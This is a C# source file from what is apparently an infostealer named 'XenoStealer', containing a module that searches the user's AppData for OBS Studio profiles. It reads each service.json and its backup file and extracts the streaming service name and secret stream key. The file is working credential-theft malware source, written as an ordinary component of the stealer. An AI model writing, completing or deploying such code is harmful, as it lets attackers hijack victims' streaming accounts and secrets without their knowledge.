using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace XenoStealer
{
    public static class OBS
    {
        public static DataExtractionStructs.OBSInfo[] GetInfo() 
        {
            string OBSProfilepath = Path.Combine(Configuration.roamingAppData, "obs-studio\\basic\\profiles");
            if (!Directory.Exists(OBSProfilepath))
            {
                return null;
            }
            JavaScriptSerializer serializer = new JavaScriptSerializer();

            List<DataExtractionStructs.OBSInfo> OBSInfos = new List<DataExtractionStructs.OBSInfo>();

            foreach (string profile in Directory.GetDirectories(OBSProfilepath))
            {
                string ServiceFile = Path.Combine(profile, "service.json");
                string BackupServiceFile = Path.Combine(profile, "service.json.bak");
                foreach (string i in new string[] { ServiceFile, BackupServiceFile })
                {
                    if (!File.Exists(i)) 
                    {
                        continue;
                    }

                    string filedata = Utils.ForceReadFileString(i);

                    if (filedata == null) 
                    {
                        continue;
                    }

                    try
                    {
                        dynamic jsonObject = serializer.Deserialize<dynamic>(filedata);
                        if (jsonObject == null || !jsonObject.ContainsKey("settings")) 
                        {
                            continue;
                        }
                        string service = jsonObject["settings"]?["service"];
                        string key = jsonObject["settings"]?["key"];

                        if (service == null || key == null) 
                        {
                            continue;
                        }
                        OBSInfos.Add(new DataExtractionStructs.OBSInfo(service, key));
                    }
                    catch
                    {

                    }

                }
            }

            

            return OBSInfos.ToArray();

        }
    }
}
